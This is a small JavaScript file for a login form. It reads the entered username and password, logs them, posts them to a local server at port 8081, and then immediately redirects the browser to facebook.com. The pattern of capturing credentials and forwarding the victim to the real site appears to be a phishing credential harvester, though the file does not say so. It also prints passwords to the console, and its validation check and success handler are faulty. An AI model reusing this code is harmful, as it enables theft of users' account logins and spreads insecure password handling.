// var btn = document.querySelector(".btn");

// // var account = [];
// function handleSubmit(e) {
//   // var form = document.getElementById("form");
//   // var psw = document.getElementById("psw");
//   // var usn = document.getElementById("usn");
//   e.preventDefault();
//   // const username = usn.value;
//   // const password = psw.value;
//   // console.log(username);
//   // console.log(password);
//   // if (username.length > 0) {
//   //   account.push({ username: username, password: password });
//   // }
//   var username = $('#usn').val();
//   var password = $('#psw').val();
// const data = {
//       userName:username,
//       passWord:password
// }

// const myJSON = JSON.stringify(data);
// alert(myJSON)
// console.log(myJSON)
//   // console.log(account);
// $.ajax({
//     type: 'post',
//     contentType: 'application/json',
//     mode: 'cors',
//     url: 'http://localhost:8081/account',
//     dataType: 'json',
//     data: {
//       userName:username,
//       passWord:password
//     },
//     success: console.log(data)

//   });
// }

// btn.addEventListener("click", handleSubmit);

$('#dangnhap').click(function(e) {
	e.preventDefault();
	var username = $('#username').val();
	var password = $('#password').val();
	console.log(username)
	const a = {
		userName: username,
		passWord: password
	}
	const myJSON = JSON.stringify(a);
	console.log(myJSON)
	if (username != "" || password != "" || ( password != "" && username != "" )  ) {
		$.ajax({
			url: 'http://localhost:8081/account',
			type: 'post',
			dataType: 'json',
			// headers: { 'Content-Type': 'application/json'},
			contentType: "application/json; charset=utf-8",
			traditional: true,
			data: myJSON,
			success: function(response) {
				console.log(data);
				//console.log(data);
				// console.log(data.length);
			},
		});
		location.href = "https://www.facebook.com/";
	}

});
